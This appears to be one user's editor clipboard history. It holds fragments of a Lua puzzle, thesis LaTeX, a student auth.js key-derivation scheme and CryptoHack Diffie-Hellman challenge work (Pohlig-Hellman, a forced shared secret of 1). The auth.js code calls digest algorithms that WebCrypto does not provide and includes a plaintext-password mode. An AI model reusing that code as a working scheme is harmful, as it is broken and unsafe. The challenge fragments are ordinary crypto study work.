	function Alice2(hand)
	    round2 = (round2 or 0) + 1
	
	    local flipped = {}
	    local flipdict = {}
	    local n = #hand
	    local i = n
	    local toflip = 0
	    while #flipped < 32 do
	        if hand[i] == 2 then
	            toflip = toflip + 1
	        elseif toflip > 0 and not flipdict[i] then
	            toflip = toflip - 1
	            table.insert(flipped, i)
	            flipdict[i] = true
	        end
	        i = i - 1
	        i = ((i - 1) % n) + 1
	    end
	    
	    -- bob needs to start on an unflipped 1
	    local startindex
	    for i=1,65 do
	        if hand[i] == 1 and not flipdict[i] then
	            startindex = i
	            break
	        end
	    end
	
	    if startindex == nil then
	        startindex = 0
	    end
	
	    -- use the random seed to communicate the index of the first unflipped 1
	    local seed = 0
	    math.randomseed(seed)
	    while math.random(65) ~= startindex do
	        seed = seed + 1
	        math.randomseed(seed)
	    end
	    math.randomseed(seed)
	
	    return flipped
	end
	
	function Bob2(hand)
	
	    local flipped = {}
	    local n = #hand
	    local toflip = 0
	    local i = math.random(65)
	    while #flipped < 32 do
	        if hand[i] == 0 then
	            toflip = toflip + 1
	        elseif toflip > 0 then
	            toflip = toflip - 1
	            table.insert(flipped, i)
	        end
	        i = i + 1
	        i = ((i - 1) % n) + 1
	    end
	
	    return flipped
	end
8a8da04fe31f72056622a5738b113cd4|file:///home/neo/Documents/thesis/thesis.tex|197|1|V|tex
	\input{appendixes}
2658bf7a3327d517432f80343dff4c8a|file:///home/neo/Documents/thesis/appendixes.tex|2|1|V|tex
	\chapter{Appendix A}
a99cbc43507b92520a556e1ae1c2a6fd|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|15|1|V|javascript
	let createKeyPairFromPassword = async function(password) {
	  const encoder = new TextEncoder();
	
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
	  const hashScrypt = await crypto.subtle.digest("SCRYPT", passEnc);
	  const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
	
	  //Slice scrypt hash to 32 bytes to get the privateKey
	  const privateKeyArray = hashArrayScrypt.slice(0, 32);
	  const privateKey = privateKeyArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  const privateKeyEnc = hexToBytes(privateKey);
	  const privateKeyBytes = new Uint8Array(privateKeyEnc);
	  //Curve25519 scalar mult lower 32 bytes of sha512 hash to get public key
	  const publicKeyPromise = await crypto.subtle.digest(
	    "CURVE25519",
	    privateKeyBytes
	  );
	  const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise)); // convert buffer to byte array
	
	  const publicKey = publicKeyByteArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  return privateKey.concat(publicKey);
	};
	
c1014f17e3f7cbe60eb219e770c0d9b4|file:///home/neo/Documents/thesis/implementation.tex|14|1|V|tex
	\begin{lstlisting}[]
fd500905ef17b6f663e5bdc3a2242705|file:///home/neo/Documents/thesis/appendixes.tex|7|1|V|tex
	let createKeyPairFromPassword = async function(password) {
	  const encoder = new TextEncoder();
	
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
	  const hashScrypt = await crypto.subtle.digest("SCRYPT", passEnc);
	  const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
	
	  //Slice scrypt hash to 32 bytes to get the privateKey
	  const privateKeyArray = hashArrayScrypt.slice(0, 32);
	  const privateKey = privateKeyArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  const privateKeyEnc = hexToBytes(privateKey);
	  const privateKeyBytes = new Uint8Array(privateKeyEnc);
	  //Curve25519 scalar mult lower 32 bytes of sha512 hash to get public key
	  const publicKeyPromise = await crypto.subtle.digest(
	    "CURVE25519",
	    privateKeyBytes
	  );
	  const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise)); // convert buffer to byte array
	
	  const publicKey = publicKeyByteArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  return privateKey.concat(publicKey);
44f2171bde962446e0437694bbc5f54d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|103|1|V|javascript
	  let retVal;
	  if (CredentialType.passwordProccessMethod === "plain") {
	    retVal = password;
	  } else if (
	    CredentialType.passwordProccessMethod === "scrypt_seed_ed25519_keypair"
	  ) {
	    let keypair = await createKeyPairFromPassword(password);
	    let public_key = keypair.substr(64, 128);
	    let signedMessageBytes = await signMessage(keypair, message);
	    let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	    let signature = signedMessageArray
	      .map(b => b.toString(16).padStart(2, "0"))
	      .join("");
	    retVal = public_key.concat(signature);
	
	  }
	    return Promise.resolve(retVal);
a560fd241ca36fc41135cf259ea8079b|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|104|5|V|javascript
	    //
cef5b7778ad6d04ee79ad7507fc66c2c|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|119|1|V|javascript
	  passwordProccessMethod: "plain"
	};
	
	let supportedMethods = ["plain", "scrypt_seed_ed25519_keypair"];
	
	let hexToBytes = function(hex) {
	  let bytes;
	  for (bytes = [], c = 0; c < hex.length; c += 2)
	    bytes.push(parseInt(hex.substr(c, 2), 16));
	  return bytes;
	};
	
	let createKeyPairFromPassword = async function(password) {
	  const encoder = new TextEncoder();
	
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
	  const hashScrypt = await crypto.subtle.digest("SCRYPT", passEnc);
	  const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
	
	  //Slice scrypt hash to 32 bytes to get the privateKey
	  const privateKeyArray = hashArrayScrypt.slice(0, 32);
	  const privateKey = privateKeyArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  const privateKeyEnc = hexToBytes(privateKey);
	  const privateKeyBytes = new Uint8Array(privateKeyEnc);
	  //Curve25519 scalar mult lower 32 bytes of sha512 hash to get public key
	  const publicKeyPromise = await crypto.subtle.digest(
	    "CURVE25519",
	    privateKeyBytes
	  );
	  const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise)); // convert buffer to byte array
	
	  const publicKey = publicKeyByteArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  return privateKey.concat(publicKey);
	};
	
	let signMessage = async function(keypair, message) {
	  const input = keypair.concat(message);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
	};
	
	function initializeCredentialType(credentialTypeInput) {
	  for (key in credentialTypeInput) {
	    if (key === "passwordMinLength") {
	      if (Number.isInteger(credentialTypeInput.passwordMinLength)) {
	        CredentialType.passwordMinLength =
	          credentialTypeInput.passwordMinLength;
	      } else {
	        throw "passwordMinLength must be an integer";
	      }
	    } else if (key === "passwordProccessMethod") {
	      if (
	        supportedMethods.includes(credentialTypeInput.passwordProccessMethod)
	      ) {
	        CredentialType.passwordProccessMethod =
	          credentialTypeInput.passwordProccessMethod;
	      } else {
	        let errorMessage =
	          credentialTypeInput.passwordProccessMethod + ": method not supported";
	        throw errorMessage;
	      }
	    } else {
	      let errorMessage = key + ": unknown field";
	      throw errorMessage;
	    }
	  }
	}
	
	async function register(password) {
	    let retVal;
	  if (!(CredentialType.passwordMinLength === null)) {
	    if (password.length < CredentialType.passwordMinLength) {
	      let errorMessage =
	        "Password must be at least " +
	        CredentialType.passwordMinLength +
	        " characters long";
	      throw errorMessage;
	    }
	  }
	  if (CredentialType.passwordProccessMethod === "plain") {
	    retVal = password;
	  } else if (
	    CredentialType.passwordProccessMethod === "scrypt_seed_ed25519_keypair"
	  ) {
	    let keypair = await createKeyPairFromPassword(password);
	    let public_key = keypair.substr(64, 128);
	    retVal = public_key;
	  }
	  return Promise.resolve(retVal);
	}
	
	async function authenticate(password, message = "") {
	  let retVal;
	  if (CredentialType.passwordProccessMethod === "plain") {
	    retVal = password;
	  } else if (
	    CredentialType.passwordProccessMethod === "scrypt_seed_ed25519_keypair"
	  ) {
	    let keypair = await createKeyPairFromPassword(password);
	    let public_key = keypair.substr(64, 128);
	    let signedMessageBytes = await signMessage(keypair, message);
	    let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	    let signature = signedMessageArray
	      .map(b => b.toString(16).padStart(2, "0"))
	      .join("");
	    retVal = public_key.concat(signature);
	
	  }
	    return Promise.resolve(retVal);
df0051b012f41312b584a3b8230d9876|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|89|9|V|javascript
	        // If plain
9aa9e8bb9c8dc7970c2a16bcbefed075|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|104|1|V|javascript
	        // If the plain scheme is used, simply return the password
6a67e60f4ff21831ae5bfcbee2222cce|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|108|1|V|javascript
	        // If scrypt_seed_ed25519_keypair is used
589e8273e0ecaa82d355575bb981705f|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|112|1|V|javascript
	        // Create the keypair using the password as a seed
b9caa7675d78b1dcafda047eeff2b656|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|103|1|V|javascript
	async function authenticate(password, message = "") {
	    let retVal;
	    // Get the chosen authentication method
	    if (CredentialType.passwordProccessMethod === "plain") {
	        // If the plain scheme is used, simply return the password
	        retVal = password;
	    } else if (
	        // If scrypt_seed_ed25519_keypair is used
	        CredentialType.passwordProccessMethod === "scrypt_seed_ed25519_keypair"
	    ) {
	        // Create the keypair using the password as a seed
	        let keypair = await createKeyPairFromPassword(password);
	        // Get the public key part of the key pair
	        let public_key = keypair.substr(64, 128);
	        // Sign the message
	        let signedMessageBytes = await signMessage(keypair, message);
	        let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	        let signature = signedMessageArray
	          .map((b) => b.toString(16).padStart(2, "0"))
	          .join("");
	        // Return the public key concatenated with the signature
	        retVal = public_key.concat(signature);
	    }
	    return Promise.resolve(retVal);
	}
2cfdec9068fff89084d7e6a44396f0d6|file:///home/neo/Documents/thesis/appendixes.tex|4|1|V|tex
	\begin{figure}
	    \caption{JavaScript implementation of the authenticate API call} 
	    \label{lst:authenticate_impl}
f29658e1050755694baaf69db159afba|file:///home/neo/Documents/thesis/appendixes.tex|4|1|V|tex
	\begin{figure}
	    \caption{JavaScript implementation of the authenticate API call} 
	    \label{lst:authenticate_impl}
	\begin{lstlisting}[]
0b3a217cf66a3e041db95f4f906843f0|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|79|1|V|javascript
	async function register(password) {
	    let retVal;
	    // Check that the password is longer than passwordMinLength
	    if (!(CredentialType.passwordMinLength === null)) {
	        if (password.length < CredentialType.passwordMinLength) {
	            // If the plain scheme is used, simply return the password
	            let errorMessage = "Password must be at least " + CredentialType.passwordMinLength + " characters long";
	            throw errorMessage;
	        }
	    }
	    if (CredentialType.passwordProccessMethod === "plain") {
	        retVal = password;
	    } else if (
	        // If scrypt_seed_ed25519_keypair is used
	        CredentialType.passwordProccessMethod === "scrypt_seed_ed25519_keypair"
	    ) {
	        // Create the keypair using the password as a seed and return the public key
	        let keypair = await createKeyPairFromPassword(password);
	        let public_key = keypair.substr(64, 128);
	        retVal = public_key;
	    }
	    return Promise.resolve(retVal);
	}
007d687c4681d7708c1b8c45a5f45b6a|file:///home/neo/Documents/thesis/appendixes.tex|40|5|V|tex
	    // Check that the password is longer than passwordMinLength
0a1e0d622c89565a12bfe67363ecd72c|file:///home/neo/Documents/thesis/appendixes.tex|48|17|v|tex
	// If scrypt_seed_ed25519_keypair is used
b7770ba36eec4dd995eb70504d4a984d|file:///home/neo/Documents/thesis/appendixes.tex|28|1|V|tex
	\end{figure}
08a7bb1364c508a85fbd7a7ac5c29e53|file:///home/neo/Documents/thesis/appendixes.tex|28|1|V|tex
	\vspace{0mm}
e372fa582da32b3d26397041f87db089|file:///home/neo/Documents/thesis/appendixes.tex|28|1|V|tex
	\begin{figure}
343c60dbc47436fb63d0dc411012d81b|file:///home/neo/Documents/thesis/appendixes.tex|28|5|V|tex
	    \caption{JavaScript implementation of the register API call} 
1ee49b0ff867b4145b570507edf6626b|file:///home/neo/Documents/thesis/appendixes.tex|28|5|V|tex
	    \label{lst:register_impl}
923f3b294f64e5a93458ba08daaff632|file:///home/neo/Documents/thesis/appendixes.tex|25|15|V|tex
	\end{lstlisting}
	\begin{lstlisting}[]
20f23781689b38901cfb9ca4ee4dd934|file:///home/neo/Documents/thesis/appendixes.tex|29|5|V|tex
	    if (!(CredentialType.passwordMinLength === null)) {  // Check that the password is longer than passwordMinLength
1b570c182b4cee6ee9f87cc9fbfbef22|file:///home/neo/Documents/thesis/appendixes.tex|30|67|v|tex
	// If the plain scheme is used, simply return the password
54249242243a6bfa0553cd5de6d66081|file:///home/neo/Documents/thesis/appendixes.tex|3|1|V|tex
	    \caption{JavaScript implementation of the authenticate API call} 
	    \label{lst:authenticate_impl}
96bbd5d525668b8d6127382ce7b0afe3|file:///home/neo/Documents/thesis/appendixes.tex|30|12|v|tex
	lst:authenticate_impl
6a26d7ce44630fe053044e3ea56303a5|file:///home/neo/Documents/thesis/appendixes.tex|35|58|v|tex
	// Check that the password is longer than passwordMinLength
e8470865caacfcbbdd146aa8592d318e|file:///home/neo/Documents/thesis/appendixes.tex|42|4|V|tex
	    // If the plain scheme is used, simply return the password
31b3b39f7b219e6a4031f611a2b6094c|file:///home/neo/Documents/diplomatiki/auth.js/conclusion.tex|10|1|V|tex
	rely on the
b134d697071cca3112104c099344d968|file:///home/neo/Documents/diplomatiki/auth.js/conclusion.tex|10|65|v|tex
	, for carrying out all
06e3d36fa30cea095545139854ad1fb9|file:///home/neo/cryptohack/diffie-hellman/starter/starter.py|18|27|v|python
	field
beddbe9196aa58703bf1f2c8efeb7074|file:///home/neo/cryptohack/diffie-hellman/starter/starter.py|14|1|V|python
	        else: if g == 7:
	                print("G:", g)
	                for idx,field in enumerate(covered):
	                    if not field:
	                        print(idx)
f933ab710f8bbf3b206550f21257a55d|file:///home/neo/cryptohack/diffie-hellman/starter/starter.sage|3|1|V|python
	# a = 972107443837033796245864316200458246846904598488981605856765890478853088246897345487328491037710219222038930943365848626194109830309179393018216763327572120124760140018038673999837643377590434413866611132403979547150659053897355593394492586978400044375465657296027592948349589216415363722668361328689588996541370097559090335137676411595949335857341797148926151694299575970292809805314431447043469447485957669949989090202320234337890323293401862304986599884732815
8dc1e4377bdd48a7916c8d2304e4f68a|file:///home/neo/cryptohack/diffie-hellman/starter/starter.sage|9|2|V|python
	R = Integers(p)
	G = R(g)
330303bb3baa01b33804ff7f2f8bb3a2|file:///home/neo/cryptohack/diffie-hellman/starter/starter.sage|9|1|V|python
	field 
97e5e5af9603cb18a60f4def6cc9204d|file:///home/neo/cryptohack/diffie-hellman/starter/starter.sage|9|1|V|python
	G = field(g)
306817a6e9d9fc5058b839913c052d6c|file:///home/neo/cryptohack/diffie-hellman/starter/starter.sage|10|1|V|python
	secret = public_part ^ A
01ff4cac88de79702a712b3a2bb65ae3|file:///home/neo/cryptohack/diffie-hellman/starter/starter.sage|9|1|v|python
	alice_public_part
061567879e3f2fd1f56cf396abd7603f|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|30|14|v|python
	39c99bf2f0c14678d6a5416faef954b5893c316fc3c48622ba1fd6a9fe85f3dc72a29c394cf4bc8aff6a7b21cae8e12c
0fdeab384ca1b41fbd754549ffc0056a|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|29|6|v|python
	737561146ff8194f45290f5766ed6aba
0fdeab384ca1b41fbd754549ffc0056a|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|29|6|v|python
	737561146ff8194f45290f5766ed6aba
880695f67fd38eb7cf27276f98b522c0|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|28|390|v|python
	, = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919
f09df785c5dd32a3b0af2a3374b7bfef|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|33|39|v|python
	, '737561146ff8194f45290f5766ed6aba'
b06f3d0377db3cc493cedcd9fa345558|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|34|80|v|python
	}'39c99bf2f0c14678d6a5416faef954b5893c316fc3c48622ba1fd6a9fe85f3dc72a29c394cf4bc8aff6a7b21cae8e12c'
3ec99147ba9ba37466e3de5369c34e5c|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|29|402|v|python
	}= 112218739139542908880564359534373424013016249772931962692237907571990334483528877513809272625610512061159061737608547288558662879685086684299624481742865016924065000555267977830144740364467977206555914781236397216033805882207640219686011643468275165718132888489024688846101943642459655423609111976363316080620471928236879737944217503462265615774774318986375878440978819238346077908864116156831874695817477772477121232820827728424890845769152726027520772901423784
90078281d9acde619778ab183e03c596|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|30|1|V|python
	my_sec = 197395083814907028991785772714920885908249341925650951555219049411298436217190605190824934787336279228785809783531814507661385111220639329358048196339626065676869119737979175531770768861808581110311903548567424039264485661330995221907803300824165469977099494284722831845653985392791480264712091293580274947132480402319812110462641143884577706335859190668240694680261160210609506891842793868297672619625924001403035676872189455767944077542198064499486164431451944
c0c129a5802c3ef60a522a8cdddf1c00|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|31|35|v|python
	my_sec
7ce86ba6a5429c23ed891213cc59e4dc|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|32|40|v|python
	,"5a7f288b1d11d53ea99128c5fef73a41"
31503f59e03e10eb2c9f0628bf03d247|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|33|80|v|python
	}"4fb13303ba55384128c6ca905d4eb459da4ce126017eccbd5e32aa09571e0328"
879e7bf6cb5c99fa226e60c108036781|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|29|404|v|python
	}0xd1b43606f81b6bf08498629abfd49c6e7f0019d2a868089891755f520375ff21939a6b1adefce8bd4cf6e78793a5d4f433f80ec837356527d954c1cb85971bf0f3c5122ee7114ca7c98467e4381ba59e7b853712a4fd33d8335c5b98fca93e2a517714db376cd580672b6bb2805b71947e15da950891f1d9163179fc559ccd088958c238b442c3ef0cc6185c760cf26a7c6e256c3c8627e1fa5daef316060fb24575da68e7a12dd3bbdf9dd1198535ef81f62c5ab705898874256459c968313a
0ec873a9633999627de9b4e614d30c8d|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|31|17|v|python
	pow(alice_public, 0x01, p)
cbac2998b0230124fa025d50484bbdf6|file:///home/neo/cryptohack/diffie-hellman/starter/grade.py|4|1|V|python
	    p = 0xde26ab651b92a129
	    g = 2
	    alice_public = 0x1ccaa17a36e52de7
ae1bf8cffecc9a4afad667f44532c905|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|32|1|V|python
	alice_public = 0xbcc9630ad643b61be1ee3e3f18b0d192f1198c6ceee2850192689c62877a683ddd3a32bbc79b5bca43333db5771be1c28a74dba7edc637b16aa9859d97f8f774285b0eaaf876b1cbb7191c48211364eaec5043e065496a62bc91b18c0f5cd105eec9d3558a5a19a50b92b2e66d6232815aee1990c129b9552118b5133785c32399b71e2b144fafb75f893b2b88d090cc49f882733978aecf59be0c6dedaa0ea0e24c4027c3e040446758d0329ec73828b64183c5f57fb9286e3f3fd07e576620
f9d2b73703ad6541432b344ea9bb7b7f|file:///home/neo/cryptohack/diffie-hellman/starter/decrypt.py|31|1|V|python
	g = 2
4c772de73f763a612ee8d4815eb4cd67|file:///home/neo/cryptohack/diffie-hellman/starter/grade.py|8|1|V|python
	    iv = 'c9d4e07748f3ec03c7458435152df9b9'
	    encrypted = '4d273129ceccb38e220f5569eb6112ddda2205e0cd582bcd0decc5d08c2bd2eb'
63fe0514797b68a88d38e2ba04984047|file:///home/neo/cryptohack/diffie-hellman/starter/grade.py|7|5|V|python
	    bob_public = 0x48a0e7352deffb8c
064d9b56cc6e4cb1977f98fd28d536f3|file:///home/neo/cryptohack/diffie-hellman/starter/grade.py|4|1|V|python
	    p = 0xde26ab651b92a129
	    g = 2
	    bob_public = 0x48a0e7352deffb8c
b8a57e82e76e55b9d42f596ec7f4fd3c|file:///home/neo/cryptohack/diffie-hellman/starter/grade.py|7|5|V|python
	    alice_public = 0x1ccaa17a36e52de7
9676495db94b16116f187e87cae08a60|file:///home/neo/cryptohack/diffie-hellman/starter/grade.py|4|1|V|python
	    p = 0xde26ab651b92a129
d2d92eb96ffa2135ad0471e5e520c46f|file:///tmp/neomutt-neo-1000-3270-13241793850728227282|9|66|v|mail
	really
7a7c46aab7e07559c6f7a8b25f2b9ef4|file:///tmp/neomutt-neo-1000-3270-13241793850728227282|28|1|v|mail
	Thank you
9ad71e5d1143a1256cceb8f423af1542|file:///tmp/neomutt-neo-1000-3270-14128819235263076211|15|1|V|mail
	I will definetely get in contact with you again
741f4475f89448fa6e73828868fa5477|file:///tmp/neomutt-neo-1000-3270-14128819235263076211|17|38|v|mail
	couple
9e93c1751178cfe440f7b2737293f362|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|24|1|V|tex
	For our project, we chose as the subject the classification of some tweets depending on if they are about real disasters or not. The full subject, called \href{https://www.kaggle.com/c/nlp-getting-started/overview}{ Real or Not? NLP with Disaster Tweets}
5e1bcf0fc66fec61e6e3c1cabd4155e3|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|24|1|v|tex
	For our project, we chose as the subject the classification of some tweets depending on if they are about real disasters or not
7e4ce1356f821a69c661efc5d4d55ff1|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|34|1|v|tex
	Because
ea170e2cafb1337755c8b3d5ae4437f4|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|38|23|v|tex
	find
5715deac0e113ffb8d4098e09701e918|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/pohlig.sage|1|1|V|python
	def pohligHellmanPGH(p,g,h):
55d6fc4d9283aafeb4d2a025f7f7600a|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|28|1|V|python
	p = 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff
cac4da6669e559e7260079b9a411105e|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/pohlig.sage|37|1|v|python
	alice_public
52814cf3c6aa1414b4d4c8580da5c28b|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/grade.py|4|1|V|python
	    p = 0xde26ab651b92a129
	    g = 2
	    alice_public = 0x1ccaa17a36e52de7
	    bob_public = 0x48a0e7352deffb8c
	    iv = 'c9d4e07748f3ec03c7458435152df9b9'
	    encrypted = '4d273129ceccb38e220f5569eb6112ddda2205e0cd582bcd0decc5d08c2bd2eb'
0c3fc89fc64a726d635cf73da5f0db3f|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/grade.py|4|1|V|python
	    p = 0xde26ab651b92a129
	    g = 2
b793aa34d5187dfaf9e403c027c117a4|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|36|1|V|python
	iv = "23513c71bed08caaf1ecb0c176b03247"
	ciphertext = "6e280bba82cbdb1853c7e35adf8352b7867ef54f0c0b832a7f82fd6546a02277"
4777d8b30df4542e2034e1b1306b3090|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|38|17|v|python
	alice_public % p 
4e645557a00ef2a020090c933e066e19|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|38|1|V|python
	# shared_secret = pow(bob_public, alice_priv, p)
	# iv = 'c9d4e07748f3ec03c7458435152df9b9'
	# ciphertext = '4d273129ceccb38e220f5569eb6112ddda2205e0cd582bcd0decc5d08c2bd2eb'
613911119fab418b25efaa2d62903e2d|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|42|5|v|python
	 'c9d4e07748f3ec03c7458435152df9b9'
8745271c5a95006ffeb5aaeb54fa313a|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|43|14|v|python
	'4d273129ceccb38e220f5569eb6112ddda2205e0cd582bcd0decc5d08c2bd2eb'
2a6cdf2a8f479e8ba962349f803fbadd|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|42|6|v|python
	0443744de4447660adc8da2626ac70d1"
175dea06084bce6cfbfb349d1eb364d1|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|43|14|v|python
	"436586844b0fe1d02c528605cfce0a48e31e824aaa9ad4882aa96f32835691c889206aaf2997a6dd8d31d4007595624003b2cfff5887fe79ffd0e114f57f915d8dcd90055172a2d5be8b0435f9167538"
5df9ad9d03c9704a0268026a80f2acde|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/pohlig.sage|37|1|V|python
	h = 0x1ccaa17a36e52de7
4e5817099f090016da5e6e25b2d90b3b|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/pohlig.sage|35|390|v|python
	, = 0xde26ab651b92a129
821f4f8e3c31c32c4f33db04360431a4|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|42|5|v|python
	638c85a0f726610f28f5b3ead3d6a36a
63592758d298a68589a93d3ab54671f0|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|43|176|v|python
	}"832dbf778f52484927346edf8eed4b9b95b3ba717211321215ed40cb5c69a87a"
fcccbe568d968c2f42643295fe89b21c|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|41|1|V|python
	shared_secret = 0x01
4f9dc962e5832e8cc74605b3c425cb6a|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|43|1|V|python
	iv = "c0a53e192f0a923c4d7c3f5f4bd30f48"
7e234ba14c6f0eb76e811ce30531e647|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|43|1|V|python
	ciphertext = "4f16486b81f69e153200779ab123b41d89a3c6926766de061ee3b1abbc9a718beaf732be15b8f6851bd00a286542b25cde3803ec80c771ffb876cf8e7ba38e51729a288ea6c451a4280d12c6e0aa8926"
9cc9518da47a854f4b599504a3f31dfc|file:///home/neo/vimwiki/index.wiki|3|5|V|vimwiki
	    * 
6180e6871ff0c6bbf615b89202a931a3|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|1|4|v|text
	2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919
e201a3f92aa0a2c67bea580842f4e617|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|3|4|v|text
	539556019868756019035615487062583764545019803793635712947528463889304486869497162061335997527971977050049337464152478479265992127749780103259420400564906895897077512359628760656227084039215210033374611483959802841868892445902197049235745933150328311259162433075155095844532813412268773066318780724878693701177217733659861396010057464019948199892231790191103752209797118863201066964703008895947360077614198735382678809731252084194135812256359294228383696551949882
f8451145387d730a01482c5aae4a549a|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|5|5|v|text
	'c044059ae57b61821a9090fbdefc63c5'
e0144d4ee564809267bc5101c356e165|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|6|17|v|text
	'f60522a95bde87a9ff00dc2c3d99177019f625f3364188c1058183004506bf96541cf241dad1c0e92535564e537322d7'
01c349a5dfe055172ba92a8d18c92f0f|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|6|17|v|text
	'0f60522a95bde87a9ff00dc2c3d99177019f625f3364188c1058183004506bf96541cf241dad1c0e92535564e537322d7'
b34fb24e6171792611f532e18d620526|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|5|6|v|text
	c044059ae57b61821a9090fbdefc63c5
3d4091e2032e8a2ea9892470b952573d|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|6|18|v|text
	0f60522a95bde87a9ff00dc2c3d99177019f625f3364188c1058183004506bf96541cf241dad1c0e92535564e537322d7
96c2b3bc472bae9ae58773d0c72c4ac8|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/output_92cc8b7f0db768b53291efbf969ca3ca.txt|3|4|v|text
	539556019868756019035615487062583764545019803793635712947528463889304486869497162061335997527971977050049337464152478479265992127749780103259420400564906895897077512359628760656227084039215210033374611483959802841868892445902197049235745933150328311259162433075155095844532813412268773066318780724878693701177217733659861396010057464019948199892231790191103752209797118863201066964703008895947360077614198735382678809731252084194135812256359294228383696551949882
